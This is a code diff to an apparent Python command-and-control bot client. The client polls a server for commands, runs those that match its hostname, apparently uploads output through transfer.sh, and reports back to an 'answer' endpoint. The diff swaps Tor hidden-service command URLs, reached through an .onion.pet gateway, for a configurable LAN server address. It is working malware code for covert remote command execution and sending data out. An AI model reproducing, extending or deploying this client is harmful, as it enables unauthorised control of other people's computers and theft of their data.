@@ -6,10 +6,9 @@ import re
 import socket
 import time
 
-# cmd_url_order = 'http://mhocujuh3h6fek7k4efpxo5teyigezqkpixkbvc2mzaaprmusze6icqd.onion.pet/index.html'
-# cmd_url_answer = 'http://ggfwk7yj5hus3ujdls5bjza4apkpfw5bjqbq4j6rixlogylr5x67dmid.onion.pet/index.html'
-cmd_url_order = 'http://192.168.1.64:5000/'
-cmd_url_answer = 'http://192.168.1.64:5000/answer'
+server_ip = "192.168.1.24"
+cmd_url_order = 'http://%s:5000/' % (server_ip)
+cmd_url_answer = 'http://%s:5000/answer' % (server_ip)
 hostname = socket.gethostname()
 hostname_pattern = 'host:%s-00' % hostname
 headers = {}
@@ -37,10 +36,13 @@ def get_cmd():
 		return req
 
 def run_cmd(cmd):
+	global server_ip, cmd_url_answer
+
 	cmd_split = cmd.split('--')
 	if cmd_split[1] == hostname:
 		cmd = cmd_split[2]
 		print(cmd)
+
 
 		cmdsplit = cmd.split(' ')
 
@@ -96,7 +98,7 @@ def run_cmd(cmd):
 			transfersh_header = {'Referer': hostname_pattern+" -- "+download_url}
 			headers.update(transfersh_header)
 
-			cmd_url_answer = 'http://192.168.1.64:5000/answer'
+			cmd_url_answer = 'http://%s:5000/answer' % (server_ip)
 			req = requests.get(cmd_url_answer, headers=headers)
 			# print(req.text)
 
